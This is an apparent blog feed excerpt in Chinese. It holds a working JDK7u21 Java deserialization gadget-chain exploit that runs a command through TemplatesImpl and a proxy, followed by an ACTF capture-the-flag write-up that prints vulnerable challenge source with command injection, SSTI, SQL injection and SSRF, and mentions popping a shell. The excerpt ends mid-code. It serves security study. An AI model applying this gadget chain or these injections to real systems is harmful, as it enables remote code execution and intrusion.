javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDK7u21</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line"><span class="comment">/*        byte[] byteArray = bos.toByteArray();</span></span><br><span class="line"><span class="comment">        Base64.Encoder encoder = Base64.getEncoder();</span></span><br><span class="line"><span class="comment">        String base64 = encoder.encodeToString(byteArray);</span></span><br><span class="line"><span class="comment">        System.out.println(base64);*/</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, IOException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unser</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        <span class="keyword">return</span> objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getTemplates</span><span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        CtClass code=pool.makeClass(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        code.makeClassInitializer().insertBefore(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        code.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code.toBytecode()&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line"></span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        TemplatesImpl tpl=(TemplatesImpl) getTemplates();</span><br><span class="line">        HashMap map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;f5a5a608&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span>Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler Annotation=(InvocationHandler)constructor.newInstance(Templates.class,map);</span><br><span class="line"></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">proxy</span> <span class="operator">=</span> (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, Annotation);</span><br><span class="line"></span><br><span class="line">        HashSet mapset=<span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        mapset.add(tpl);</span><br><span class="line"></span><br><span class="line">        mapset.add(proxy);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        System.out.println(mapset);</span><br><span class="line"></span><br><span class="line">        map.put(<span class="string">&quot;f5a5a608&quot;</span>,tpl);</span><br><span class="line">        Serializ(mapset);</span><br><span class="line">        Unserializ(<span class="string">&quot;Ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行之后发现还是不行。这是因为HashSet是基于hashmap的HashSet在向hashMap添加key时其实不是按照输入顺序排的而是按照hash值来映射桶的如下<br><img src="/2025/04/28/JDK7u21/IMG_20250429-212430244.png" class=""><br><img src="/2025/04/28/JDK7u21/IMG_20250429-212452756.png" class=""><br>也就是说我们我们无法控制其顺序这久导致了，我们在反序列化时只能TemplatesImpl.equals(proxy)<br><img src="/2025/04/28/JDK7u21/IMG_20250429-214523132.png" class=""><br>这时我们在HashSet下可以看到一个构造方法其使用的map是LinkedHashMap，其基于链表来存储顺序，这就导致我们的put后的存储顺序可以根据前后的不同而去改变。</p><p>但是这个构造方法不是public<br><img src="/2025/04/28/JDK7u21/IMG_20250429-214730632.png" class=""><br><img src="/2025/04/28/JDK7u21/IMG_20250429-214802449.png" class=""><br>但是我们在LinkedHashSet里可以发现其调用了其父类HashSet的这个构造方法</p><p>这时我们就需要使用LinkedHashSet了LinkedHashSet是继承了HashSet方法的类但是其<br>在add时会按着添加顺序来设置其存储在hashmap的顺序。这样我们就可以操控两个key的先后顺序从而构造<br>proxy.equals(Templatesimpl)了</p><img src="/2025/04/28/JDK7u21/IMG_20250429-212621141.png" class="">  <p>成功弹出计算机</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;AnnotationInvocationHandler&quot;&gt;&lt;a href=&quot;#AnnotationInvocationHandler&quot; class=&quot;headerlink&quot; title=&quot;AnnotationInvocationHandler&quot;&gt;&lt;/a&gt;Annot</summary>
      
    
    
    
    
    <category term="java" scheme="https://lisien11.xyz/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>ACTF</title>
    <link href="https://lisien11.xyz/2025/04/27/ACTF/"/>
    <id>https://lisien11.xyz/2025/04/27/ACTF/</id>
    <published>2025-04-27T02:21:42.000Z</published>
    <updated>2025-05-06T07:52:38.574Z</updated>
    
    <content type="html"><![CDATA[<h1 id="下午打取证晚上打ACTF就牢了一题就牢不动了，其他题看来一下有两题是有思路的但是队友打了我也就没打了"><a href="#下午打取证晚上打ACTF就牢了一题就牢不动了，其他题看来一下有两题是有思路的但是队友打了我也就没打了" class="headerlink" title="下午打取证晚上打ACTF就牢了一题就牢不动了，其他题看来一下有两题是有思路的但是队友打了我也就没打了"></a>下午打取证晚上打ACTF就牢了一题就牢不动了，其他题看来一下有两题是有思路的但是队友打了我也就没打了</h1><h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><p>随便输都可以登陆成功，然后上传文件后发现了文件读取./upload?file_path<br><img src="/2025/04/27/ACTF/IMG_20250428-105611243.png" class=""><br>可以目录穿越<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, url_for, flash, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.getenv(<span class="string">&#x27;SECRET_KEY&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;upload&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> hashlib.sha256(password.encode()).hexdigest() == <span class="string">&#x27;32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0&#x27;</span>:</span><br><span class="line">                session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flash(<span class="string">&#x27;Invalid password&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Login&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;h2&gt;No need to register.&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        f = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        file_path = <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&#x27;_&#x27;</span> + f.filename</span><br><span class="line">        f.save(<span class="string">&#x27;./uploads/&#x27;</span> + file_path)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">f&#x27;/upload?file_path=<span class="subst">&#123;file_path&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request.args.get(<span class="string">&#x27;file_path&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Upload Image&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            file_path = <span class="string">&#x27;./uploads/&#x27;</span> + request.args.get(<span class="string">&#x27;file_path&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    content = f.read()</span><br><span class="line">                    b64 = base64.b64encode(content)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">f&#x27;&lt;img src=&quot;data:image/png;base64,<span class="subst">&#123;b64.decode()&#125;</span>&quot; alt=&quot;Uploaded Image&quot;&gt;&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                os.system(<span class="string">f&#x27;base64 <span class="subst">&#123;file_path&#125;</span> &gt; /tmp/<span class="subst">&#123;file_path&#125;</span>.b64&#x27;</span>)</span><br><span class="line">                <span class="comment"># with open(f&#x27;/tmp/&#123;file_path&#125;.b64&#x27;, &#x27;r&#x27;) as f:</span></span><br><span class="line">                <span class="comment">#     return f&#x27;&lt;img src=&quot;data:image/png;base64,&#123;f.read()&#125;&quot; alt=&quot;Uploaded Image&quot;&gt;&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;Sorry, but you are not allowed to view this image.&#x27;</span></span><br><span class="line">                </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><br>admin的密码是弱口令可以直接在cmd5查出hash对应的文明<br>登陆admin的账号后就可以进行命令注入了，执行结果会保存到文件里命令执行后读取文件即可，或者直接弹shell</p><h1 id="Excellent-Site"><a href="#Excellent-Site" class="headerlink" title="Excellent-Site"></a>Excellent-Site</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">import</span> imaplib</span><br><span class="line"><span class="keyword">import</span> email</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> email.header <span class="keyword">import</span> decode_header</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_subjects</span>(<span class="params">username, password</span>):</span><br><span class="line">    imap_server = <span class="string">&quot;192.227.128.32&quot;</span></span><br><span class="line">    imap_port = <span class="number">143</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mail = imaplib.IMAP4(imap_server, imap_port)</span><br><span class="line">        mail.login(username, password)</span><br><span class="line">        mail.select(<span class="string">&quot;inbox&quot;</span>)</span><br><span class="line">        status, messages = mail.search(<span class="literal">None</span>, <span class="string">&#x27;FROM &quot;admin@ezmail.org&quot;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> status != <span class="string">&quot;OK&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        subject = <span class="string">&quot;&quot;</span></span><br><span class="line">        latest_email = messages[<span class="number">0</span>].split()[-<span class="number">1</span>]</span><br><span class="line">        status, msg_data = mail.fetch(latest_email, <span class="string">&quot;(RFC822)&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> response_part <span class="keyword">in</span> msg_data:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(response_part, <span class="built_in">tuple</span>):</span><br><span class="line">                msg = email.message_from_bytes(response_part  [<span class="number">1</span>])</span><br><span class="line">                subject, encoding = decode_header(msg[<span class="string">&quot;Subject&quot;</span>])  [<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(subject, <span class="built_in">bytes</span>):</span><br><span class="line">                    subject = subject.decode(encoding <span class="keyword">if</span> encoding <span class="keyword">else</span> <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        mail.logout()</span><br><span class="line">        <span class="keyword">return</span> subject</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_page_content</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        parsed_url = urlparse(url)</span><br><span class="line">        <span class="keyword">if</span> parsed_url.scheme != <span class="string">&#x27;http&#x27;</span> <span class="keyword">or</span> parsed_url.hostname != <span class="string">&#x27;ezmail.org&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;SSRF Attack!&quot;</span></span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response.text</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;ERROR&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/report&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">report</span>():</span><br><span class="line">    message = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        url = request.form[<span class="string">&quot;url&quot;</span>]</span><br><span class="line">        content = request.form[<span class="string">&quot;content&quot;</span>]</span><br><span class="line">        smtplib._quote_periods = <span class="keyword">lambda</span> x: x</span><br><span class="line">        mail_content = <span class="string">&quot;&quot;&quot;From: ignored@localhost.localdomain\r\nTo: admin@localhost.localdomain\r\nSubject: &#123;url&#125;\r\n\r\n&#123;content&#125;\r\n.\r\n&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            server = smtplib.SMTP(<span class="string">&quot;192.227.128.32&quot;</span>,<span class="number">25</span>)</span><br><span class="line">            mail_content = smtplib._fix_eols(mail_content)</span><br><span class="line">            mail_content = mail_content.<span class="built_in">format</span>(url=url, content=content)</span><br><span class="line">            server.sendmail(<span class="string">&quot;ignored@ezmail.org&quot;</span>, <span class="string">&quot;admin@ezmail.org&quot;</span>, mail_content)</span><br><span class="line">            message = <span class="string">&quot;Submitted! Now wait till the end of the world.&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            message = <span class="string">&quot;Send FAILED&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;report.html&quot;</span>, message=message)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/bot&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bot</span>():</span><br><span class="line">    requests.get(<span class="string">&quot;http://ezmail.org:3000/admin&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;The admin is checking your advice(maybe)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> ip != <span class="string">&quot;127.0.0.1&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Forbidden IP&quot;</span></span><br><span class="line">    subject = get_subjects(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;p@ssword&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> subject.startswith(<span class="string">&quot;http://ezmail.org&quot;</span>):</span><br><span class="line">        page_content = fetch_page_content(subject)</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                &lt;h2&gt;Newest Advice(from myself)&lt;/h2&gt;</span></span><br><span class="line"><span class="string">                &lt;div&gt;<span class="subst">&#123;page_content&#125;</span>&lt;/div&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/news&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">news</span>():</span><br><span class="line">    news_id = request.args.get(<span class="string">&quot;id&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> news_id:</span><br><span class="line">        news_id = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    conn = sqlite3.connect(<span class="string">&quot;news.db&quot;</span>)</span><br><span class="line">    cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line">    cursor.execute(<span class="string">f&quot;SELECT title FROM news WHERE id = <span class="subst">&#123;news_id&#125;</span>&quot;</span>)</span><br><span class="line">    result = cursor.fetchone()</span><br><span class="line">    conn.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Page not found.&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> result[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">3000</span>)</span><br><span 